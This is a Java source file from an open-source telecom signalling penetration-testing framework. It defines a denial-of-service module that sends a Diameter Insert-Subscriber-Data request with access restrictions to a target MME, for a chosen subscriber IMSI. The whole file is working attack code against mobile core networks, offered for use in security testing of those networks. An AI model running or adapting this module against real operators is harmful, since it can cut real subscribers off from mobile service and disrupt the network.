/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.diameter.usecases.attacks.dos;

import com.rodan.intruder.diameter.entities.event.S6aListener;
import com.rodan.intruder.diameter.entities.event.model.InsertSubscriberDataAnswer;
import com.rodan.intruder.diameter.entities.payload.s6a.IdrPayload;
import com.rodan.intruder.diameter.usecases.attacks.DiameterModuleTemplate;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleConstants;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleOptions;
import com.rodan.intruder.diameter.usecases.model.dos.DosMoAllRatOptions;
import com.rodan.intruder.diameter.usecases.model.dos.DosMoAllRatResponse;
import com.rodan.intruder.diameter.usecases.port.DiameterGateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = DiameterModuleConstants.DOS_MO_ALL_RAT_NAME, category = DiameterModuleConstants.DOS_CATEGORY_DISPLAY_NAME,
        displayName = DiameterModuleConstants.DOS_MO_ALL_RAT_DISPLAY_NAME, brief = DiameterModuleConstants.DOS_MO_ALL_RAT_BRIEF,
        description = DiameterModuleConstants.DOS_MO_ALL_RAT_DESCRIPTION, rank = DiameterModuleConstants.DOS_MO_ALL_RAT_RANK,
        mainPayload = Constants.IDR_PAYLOAD_NAME)
public class DosMoAllRatModule extends DiameterModuleTemplate implements SignalingModule, S6aListener {
    final static Logger logger = LogManager.getLogger(DosMoAllRatModule.class);

    @Builder
    public DosMoAllRatModule(DiameterGateway gateway, DiameterModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (DosMoAllRatOptions) moduleOptions;
        var payload = IdrPayload.builder()
                .usage(IdrPayload.Usage.BAR_ACCESS_RESTRICTION)
                .destinationRealm(options.getDestinationRealm())
                .imsi(options.getImsi()).targetMmeHost(options.getTargetMme())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        getGateway().addS6aListener(this);
    }

    @Override
    protected void cleanup() throws SystemException {
        if (this.getGateway() != null)
            this.getGateway().removeS6aListener(this);
    }

    @Override
    public void doInsertSubscriberDataAnswerEvent(InsertSubscriberDataAnswer answer) {
        logger.debug("[[[[ doInsertSubscriberDataAnswerEvent ]]]]");
        logger.debug(answer);
        // TODO parse IDA and check if success of failed
        moduleResponse = DosMoAllRatResponse.builder()
                .result("IDA response received successfully. Check trace file")
                .build();
        setResultReceived(true);
        logger.debug("IDR completed!");
    }
}
